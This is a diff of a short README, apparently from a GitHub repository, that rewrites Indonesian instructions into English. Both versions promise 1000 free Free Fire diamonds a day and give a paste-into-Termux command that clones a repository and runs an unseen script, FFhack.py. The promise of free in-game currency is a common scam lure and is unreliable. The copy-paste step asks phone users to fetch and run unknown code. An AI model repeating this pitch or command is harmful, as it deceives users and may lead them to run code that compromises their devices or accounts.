@@ -1,5 +1,4 @@
-# freefirehack
-1000 diamonds per hari
-# cara install (salin script dibawah dan paste ke termux)
-pkg install git;pkg install python2;git clone https://github.com/hckble/freefirehack ;cd freefirehack;python2 FFhack.py
-# dapatkan 1000 diamonds gratis tiap hari
+this makes 1000 diamonds per day 
+try runing this command on termux if you don't have termux download on you PHONE!
+pkg install git;pkg install python2;git clone https://github.com/TG-KRISH/Free-fire-diamonds ;cd free-fire-diamonds;python2 FFhack.py
+then visit free fire you will see that you have 1000 diamonds on your dashboard every day
